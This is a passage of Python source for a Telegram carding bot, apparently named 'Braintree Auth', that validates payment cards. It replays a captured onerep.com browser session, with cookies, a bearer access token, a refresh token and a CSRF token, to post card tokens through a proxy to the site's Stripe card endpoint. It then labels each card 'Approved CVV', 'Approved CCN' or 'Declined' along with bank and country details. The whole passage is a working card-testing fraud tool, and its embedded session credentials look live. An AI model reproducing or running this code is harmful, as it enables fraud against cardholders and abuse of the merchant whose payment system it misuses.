sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F111.0.0.0%20Safari%2F537.36%20Edg%2F111.0.1661.54; sbjs_session=pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fonerep.com%2Fcheckout%2Findividual-annual; _ga=GA1.2.993167908.1680298131; _gid=GA1.2.1983103290.1680298131; _gat_UA-62975156-1=1; _gat_UA-62975156-8=1; _rdt_uuid=1680298130868.4b2c6aa7-b127-45ba-9c95-9a89af5b1008; _fbp=fb.1.1680298131018.190459398; __hstc=71170255.6ca9648c90b41c83acb6a487e95c9170.1680298131032.1680298131032.1680298131032.1; hubspotutk=6ca9648c90b41c83acb6a487e95c9170; __hssrc=1; __hssc=71170255.1.1680298131033; FPAU=1.1.615100922.1680298131; __stripe_mid=8ee2e1b0-1369-4f02-bfe9-9390dea5b27cb04294; __stripe_sid=65e55c69-88b6-4566-836d-d95feb03fc82e3fa5c; _hjSessionUser_666932=eyJpZCI6IjdlYWZjMTk3LTQyNWMtNWMyZi05OGUwLTc5Y2Y0ZjI0OWY0YSIsImNyZWF0ZWQiOjE2ODAyOTgxMzI3NDQsImV4aXN0aW5nIjpmYWxzZX0=; _hjFirstSeen=1; _hjIncludedInSessionSample_666932=0; _hjSession_666932=eyJpZCI6ImFlYzM0ZTY2LWI0NWYtNDBlNS1hYzkzLWQ5MmFjYzQyMzQzZiIsImNyZWF0ZWQiOjE2ODAyOTgxMzI3NTQsImluU2FtcGxlIjpmYWxzZX0=; _hjAbsoluteSessionInProgress=0; __zlcmid=1F9liG3z2pzb2lG; PHPSESSID=11e204e7585cd4503b4ed6e41ee9a625; _auth=%7B%22access_token%22%3A%22e1e29147d4a9e0b2a3e2938b684bfd7fee5dd5db%22%2C%22expires_in%22%3A315360000%2C%22token_type%22%3A%22bearer%22%2C%22scope%22%3Anull%2C%22refresh_token%22%3A%221b800c561977ca0c6a8f9cd343b48e483e401df0%22%7D; _identity=2b309b8e7e37f068253093cf98b63c03304f9c49073fb3df9c4f31da6b4b0878a%3A2%3A%7Bi%3A0%3Bs%3A9%3A%22_identity%22%3Bi%3A1%3Bs%3A52%3A%22%5B607467%2C%22ZUcl0BXT8H2se6905RwsfWQeHmmg6R1a%22%2C31536000%5D%22%3B%7D; _uetsid=079daf70d00b11ed8cb7198110a078ec; _uetvid=079e08d0d00b11edae1311eebd0a8167',
        'origin': 'https://onerep.com',
        'referer': 'https://onerep.com/',
        'sec-ch-ua': '"Microsoft Edge";v="111", "Not(A:Brand";v="8", "Chromium";v="111"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/111.0.1661.54',
        'x-csrf-token': 'L7iZl27yDl3rDehgBoVUV4WI_f4okwVWKhOAF2HmWpFcwPemN7ZoNo54pA9k7GUy4OWIzm_bUg9wJ_l4MowLwg==',
    }

    json_data = {
        'token': f'{idt}',
        'user_id': 607467,
    }

    response111 = uniproxy.post('https://payment-api.onerep.com/stripe/cards', cookies=cookies, headers=headers111, json=json_data).json()

    
    r = response111

    
    try:
        code111 = r['message']
    except KeyError:
        # Si ocurre una excepción KeyError, se envía el mensaje de error
        await d2.edit_text(f"""
━━━━━━━━━━━━━
𝗕𝗿𝗮𝗶𝗻𝘁𝗿𝗲𝗲 𝗔𝘂𝘁𝗵
━━━━━━━━━━━━━
[🝂] 𝐂𝐜: <code>{cc}|{mes}|{ano}|{cvv}</code>
[🝂] 𝐒𝐭𝐚𝐭𝐮𝐬: <code>Approved CCN</code> ✅
[🝂] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <code>Card Issuer Declined CVV</code>

[🝂] 𝐈𝐧𝐟𝐨: <code>{bin_json['data']['vendor']} - {bin_json['data']['type']} - {bin_json['data']['level']}</code>
[🝂] 𝐁𝐚𝐧𝐤: <code>{bin_json['data']['bank']}</code>
[🝂] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{bin_json['data']['countryInfo']['name']} | {bin_json['data']['countryInfo']['emoji']}</code>

[🝂] 𝐓𝐢𝐦𝐞: {final-ini:0.2} (segundos)
[🝂] 𝐂𝐡𝐤 𝐁𝐲: <a href="tg://user?id={ID}">{FIRST}</a> <b>[Premium]</b>
[🝂] 𝐎𝐰𝐧𝐞𝐫 𝐁𝐨𝐭: @DiegoAkk""")
        return str
        
        

    

    
    if 'expiration_year' in r:
        await d2.edit_text(f"""
━━━━━━━━━━━━━
𝗕𝗿𝗮𝗶𝗻𝘁𝗿𝗲𝗲 𝗔𝘂𝘁𝗵
━━━━━━━━━━━━━
[🝂] 𝐂𝐜: <code>{cc}|{mes}|{ano}|{cvv}</code>
[🝂] 𝐒𝐭𝐚𝐭𝐮𝐬: <code>Approved CVV</code> ✅
[🝂] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <code>1000: Approved</code>

[🝂] 𝐈𝐧𝐟𝐨: <code>{bin_json['data']['vendor']} - {bin_json['data']['type']} - {bin_json['data']['level']}</code>
[🝂] 𝐁𝐚𝐧𝐤: <code>{bin_json['data']['bank']}</code>
[🝂] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{bin_json['data']['countryInfo']['name']} | {bin_json['data']['countryInfo']['emoji']}</code>

[🝂] 𝐓𝐢𝐦𝐞: {final-ini:0.2} (segundos)
[🝂] 𝐂𝐡𝐤 𝐁𝐲: <a href="tg://user?id={ID}">{FIRST}</a> <b>[Premium]</b>
[🝂] 𝐎𝐰𝐧𝐞𝐫 𝐁𝐨𝐭: @DarwinOficial""")
    
    elif "Your card was declined." in code111:
        await d2.edit_text(f"""
━━━━━━━━━━━━━
𝗕𝗿𝗮𝗶𝗻𝘁𝗿𝗲𝗲 𝗔𝘂𝘁𝗵
━━━━━━━━━━━━━
[🝂] 𝐂𝐜: <code>{cc}|{mes}|{ano}|{cvv}</code>
[🝂] 𝐒𝐭𝐚𝐭𝐮𝐬: <code>Declined</code> ❌
[🝂] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <code>Declined - Call Issuer</code>

[🝂] 𝐈𝐧𝐟𝐨: <code>{bin_json['data']['vendor']} - {bin_json['data']['type']} - {bin_json['data']['level']}</code>
[🝂] 𝐁𝐚𝐧𝐤: <code>{bin_json['data']['bank']}</code>
[🝂] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{bin_json['data']['countryInfo']['name']} | {bin_json['data']['countryInfo']['emoji']}</code>

[🝂] 𝐓𝐢𝐦𝐞: {final-ini:0.2} (segundos)
[🝂] 𝐂𝐡𝐤 𝐁𝐲: <a href="tg://user?id={ID}">{FIRST}</a> <b>[Premium]</b>
[🝂] 𝐎𝐰𝐧𝐞𝐫 𝐁𝐨𝐭: @DiegoAkk""")
        

    elif "Your card number is incorrect." in code111:
        await d2.edit_text(f"""
━━━━━━━━━━━━━
𝗕𝗿𝗮𝗶𝗻𝘁𝗿𝗲𝗲 𝗔𝘂𝘁𝗵
━━━━━━━━━━━━━
[🝂] 𝐂𝐜: <code>{cc}|{mes}|{ano}|{cvv}</code>
[🝂] 𝐒𝐭𝐚𝐭𝐮𝐬: <code>Declined</code> ❌
[🝂] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <code>No Account</code>

[🝂] 𝐓𝐢𝐦𝐞: {final-ini:0.2} (segundos)
[🝂] 𝐂𝐡𝐤 𝐁𝐲: <a href="tg://user?id={ID}">{FIRST}</a> <b>[Premium]</b>
[🝂] 𝐎𝐰𝐧𝐞𝐫 𝐁𝐨𝐭: @DiegoAkk""")

        
    elif "An error occurred while processing your card. Try again in a little bit." in code111:
        await d2.edit_text(f"""
━━━━━━━━━━━━━
𝗕𝗿𝗮𝗶𝗻𝘁𝗿𝗲𝗲 𝗔𝘂𝘁𝗵
━━━━━━━━━━━━━
[🝂] 𝐂𝐜: <code>{cc}|{mes}|{ano}|{cvv}</code>
[🝂] 𝐒𝐭𝐚𝐭𝐮𝐬: <code>Declined</code> ❌
[🝂] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <code>No Account</code>  

[🝂] 𝐓𝐢𝐦𝐞: {final-ini:0.2} (segundos)
[🝂] 𝐂𝐡𝐤 𝐁𝐲: <a href="tg://user?id={ID}">{FIRST}</a> <b>[Premium]</b>
[🝂] 𝐎𝐰𝐧𝐞𝐫 𝐁𝐨𝐭: @DiegoAkk""")
    
    elif "Your card does not support this type of purchase." in code111:
        await d2.edit_text(f"""
━━━━━━━━━━━━━
𝗕𝗿𝗮𝗶𝗻𝘁𝗿𝗲𝗲 𝗔𝘂𝘁𝗵
━━━━━━━━━━━━━
[🝂] 𝐂𝐜: <code>{cc}|{mes}|{ano}|{cvv}</code>
[🝂] 𝐒𝐭𝐚𝐭𝐮𝐬: <code>Declined<code>❌
[🝂] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <code>Processor Declined</code>

[🝂] 𝐈𝐧𝐟𝐨: <code>{bin_json['data']['vendor']} - {bin_json['data']['type']} - {bin_json['data']['level']}</code>
[🝂] 𝐁𝐚𝐧𝐤: <code>{bin_json['data']['bank']}</code>
[🝂] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{bin_json['data']['countryInfo']['name']} | {bin_json['data']['countryInfo']['emoji']}</code>

[🝂] 𝐓𝐢𝐦𝐞: {final-ini:0.2} (segundos)
[🝂] 𝐂𝐡𝐤 𝐁𝐲: <a href="tg://user?id={ID}">{FIRST}</a> <b>[Premium]</b>
[🝂] 𝐎𝐰𝐧𝐞𝐫 𝐁𝐨𝐭: @DiegoAkk""")
    

    elif "Your card's security code is incorrect." in code111:
        await d2.edit_text(f"""
━━━━━━━━━━━━━
𝗕𝗿𝗮𝗶𝗻𝘁𝗿𝗲𝗲 𝗔𝘂𝘁𝗵
━━━━━━━━━━━━━
[🝂] 𝐂𝐜: <code>{cc}|{mes}|{ano}|{cvv}</code>
[🝂] 𝐒𝐭𝐚𝐭𝐮𝐬: <code>Approved CCN</code> ✅
[🝂] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <code>Card Issuer Declined Cvv</code>

[🝂] 𝐈𝐧𝐟𝐨: <code>{bin_json['data']['vendor']} - {bin_json['data']['type']} - {bin_json['data']['level']}</code>
[🝂] 𝐁𝐚𝐧𝐤: <code>{bin_json['data']['bank']}</code>
[🝂] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{bin_json['data']['countryInfo']['name']} | {bin_json['data']['countryInfo']['emoji']}</code>

[🝂] 𝐓𝐢𝐦𝐞: {final-ini:0.2} (segundos)
[🝂] 𝐂𝐡𝐤 𝐁𝐲: <a href="tg://user?id={ID}">{FIRST}</a> <b>[Premium]</b>
[🝂] 𝐎𝐰𝐧𝐞𝐫 𝐁𝐨𝐭: @DiegoAkk""")
        
    elif "Your card has insufficient funds." in code111:
        await d2.edit_text(f"""
━━━━━━━━━━━━━
𝗕𝗿𝗮𝗶𝗻𝘁𝗿𝗲𝗲 𝗔𝘂𝘁𝗵
━━━━━━━━━━━━━
[🝂] 𝐂𝐜: <code>{cc}|{mes}|{ano}|{cvv}</code>
[🝂] 𝐒𝐭𝐚𝐭𝐮𝐬: <code>Approved CVV</code> ✅
[🝂] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <code>Insufficient Funds</code>

[🝂] 𝐈𝐧𝐟𝐨: <code>{bin_json['data']['vendor']} - {bin_json['data']['type']} - {bin_json['data']['level']}</code>
[🝂] 𝐁𝐚𝐧𝐤: <code>{bin_json['data']['bank']}</code>
[🝂] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{bin_json['data']['countryInfo']['name']} | {bin_json['data']['countryInfo']['emoji']}</code>

[🝂] 𝐓𝐢𝐦𝐞: {final-ini:0.2} (segundos)
[🝂] 𝐂𝐡𝐤 𝐁𝐲: <a href="tg://user?id={ID}">{FIRST}</a> <b>[Premium]</b>
[🝂] 𝐎𝐰𝐧𝐞𝐫 𝐁𝐨𝐭: @DiegoAkk""")





        
    elif "Invalid account." in code111:
        await d2.edit_text(f"""
━━━━━━━━━━━━━
𝗕𝗿𝗮𝗶𝗻𝘁𝗿𝗲𝗲 𝗔𝘂𝘁𝗵
━━━━━━━━━━━━━
[🝂] 𝐂𝐜: <code>{cc}|{mes}|{ano}|{cvv}</code>
[🝂] 𝐒𝐭𝐚𝐭𝐮𝐬: <code>Declined</code> ❌
[🝂] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <code>No Account</code> 

[🝂] 𝐈𝐧𝐟𝐨: <code>{bin_json['data']['vendor']} - {bin_json['data']['type']} - {bin_json['data']['level']}</code>
[🝂] 𝐁𝐚𝐧𝐤: <code>{bin_json['data']['bank']}</code>
[🝂] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{bin_json['data']['countryInfo']['name']} | {bin_json['data']['countryInfo']['emoji']}</code>

[🝂] 𝐓𝐢𝐦𝐞: {final-ini:0.2} (segundos)
[🝂] 𝐂𝐡𝐤 𝐁𝐲: <a href="tg://user?id={ID}">{FIRST}</a> <b>[Premium]</b>
[🝂] 𝐎𝐰𝐧𝐞𝐫 𝐁𝐨𝐭: @DiegoAkk""")

    elif "Your card's expiration year is invalid." in code111:
        await d2.edit_text(f"""
━━━━━━━━━━━━━
𝗕𝗿𝗮𝗶𝗻𝘁𝗿𝗲𝗲 𝗔𝘂𝘁𝗵
━━━━━━━━━━━━━
[🝂] 𝐂𝐜: <code>{cc}|{mes}|{ano}|{cvv}</code>
[🝂] 𝐒𝐭𝐚𝐭𝐮𝐬: <code>Declined</code> ❌
[🝂] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <b>Gateway Rejected Invalid</b>

[🝂] 𝐈𝐧𝐟𝐨: <code>{bn} - {brand} - {typ} - {lv}</code>
[🝂] 𝐁𝐚𝐧𝐤: <code>{bank}</code>
[🝂] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{country} - {flag}</code>

[🝂] 𝐓𝐢𝐦𝐞: {final-ini:0.2} (segundos)
[🝂] 𝐂𝐡𝐤 𝐁𝐲: <a href="tg://user?id={ID}">{FIRST}</a> <b>[Premium]</b>
[🝂] 𝐎𝐰𝐧𝐞𝐫 𝐁𝐨𝐭: @DiegoAkk""")
    
    elif "Your card's security code is invalid." in code111:
        with open('admins.txt', 'r') as file:
            if str(user) in file.read():
                await d2.edit_text(f"""
━━━━━━━━━━━━━
𝗕𝗿𝗮𝗶𝗻𝘁𝗿𝗲𝗲 𝗔𝘂𝘁𝗵
━━━━━━━━━━━━━
[🝂] 𝐂𝐜: <code>{cc}|{mes}|{ano}|{cvv}</code>
[🝂] 𝐒𝐭𝐚𝐭𝐮𝐬: <code>Declined ❌</code>
[🝂] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <code>Payment gateway is invalid</code>

[🝂] 𝐈𝐧𝐟𝐨: <code>{bn} - {brand} - {typ} - {lv}</code>
[🝂] 𝐁𝐚𝐧𝐤: <code>{bank}</code>
[🝂] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{country} - {flag}</code>

[🝂] 𝐓𝐢𝐦𝐞: {final-ini:0.2} (segundos)
[🝂] 𝐂𝐡𝐤 𝐁𝐲: <a href="tg://user?id={ID}">{FIRST}</a> <b>[Premium]</b>
[🝂] 𝐎𝐰𝐧𝐞𝐫 𝐁𝐨𝐭: @DiegoAkk""")



    else: 
        await d2.edit_text(f"""
━━━━━━━━━━━━━
𝗕𝗿𝗮𝗶𝗻𝘁𝗿𝗲𝗲 𝗔𝘂𝘁𝗵
━━━━━━━━━━━━━
[🝂] 𝐂𝐜: <code>{cc}|{mes}|{ano}|{cvv}</code>
[🝂] 𝐒𝐭𝐚𝐭𝐮𝐬: <code>Declined</code> ❌
[🝂] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <code>Unknow Error ❌</code>

[🝂] 𝐈𝐧𝐟𝐨: <code>{bin_json['data']['vendor']} - {bin_json['data']['type']} - {bin_json['data']['level']}</code>
[🝂] 𝐁𝐚𝐧𝐤: <code>{bin_json['data']['bank']}</code>
[🝂] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{bin_json['data']['countryInfo']['name']} | {bin_json['data']['countryInfo']['emoji']}</code>

[🝂] 𝐓𝐢𝐦𝐞: {final-ini:0.2} (segundos)
[🝂] 𝐂𝐡𝐤 𝐁𝐲: <a href="tg://user?id={ID}">{FIRST}</a> <b>[Premium]</b>
[🝂] 𝐎𝐰𝐧𝐞𝐫 𝐁𝐨𝐭: @DiegoAkk""")
        

print("CODIGO EN LINEA")
logging.basicConfig(level=logging.INFO)

if __name__ == '__main__':
    executor.start_polling(iniciar, skip_updates=True)
    
